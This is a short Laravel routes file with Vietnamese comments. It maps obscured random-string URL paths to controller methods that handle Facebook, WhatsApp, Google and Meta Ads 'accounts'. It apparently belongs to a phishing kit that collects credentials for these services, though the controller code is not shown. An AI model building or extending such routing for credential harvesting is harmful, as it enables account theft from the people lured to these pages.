<?php

use App\Http\Controllers\CustomWeb;
use App\Http\Controllers\NormalWeb;
use App\Http\Controllers\RealtimeWeb;
use Illuminate\Support\Facades\Route;

// Acc của web thường
Route::post('8rnkhonglanng-348tnvnfgkghovkrbfr-4ntifgj', [NormalWeb::class, 'post'])->name('post.normalweb');
// Acc web realtime
Route::post('74h4bgjfijhgh0-fnghbivedjvh', [RealtimeWeb::class, 'facebook_post'])->name('post.realtimeweb.facebook');
Route::post('2n34b4v4j-n4h4c4n4k34lk4v4x3k23o32ui3gh3f-3rjfgrtfuhjbrbngn', [RealtimeWeb::class, 'whatsapp_post'])->name('post.realtimeweb.whatsapp');
Route::post('1v4j78jk8b-3c2nybv8cd5432hjtyiovyuw53tuji-ggogkfkerhfhchdnebwia897837', [RealtimeWeb::class, 'google_post'])->name('post.realtimeweb.google');
// acc custom web
Route::post('t489u5tefyu-8i9obfctgdvxkhjnu34r5tw0', [CustomWeb::class, 'facebook_post'])->name('post.customweb.facebook');
Route::post('hbujik4r35th-ui4r3tgvyu4rfwyhbigurfe', [CustomWeb::class, 'whatsapp_post'])->name('post.customweb.whatsapp');

// METAADS CUSTOM THEME
Route::post('2ntrjk7i38rf0-bgfjnkwerfuyg34rt5tg90', [CustomWeb::class, 'metaads_post'])->name('post.customweb.metaads');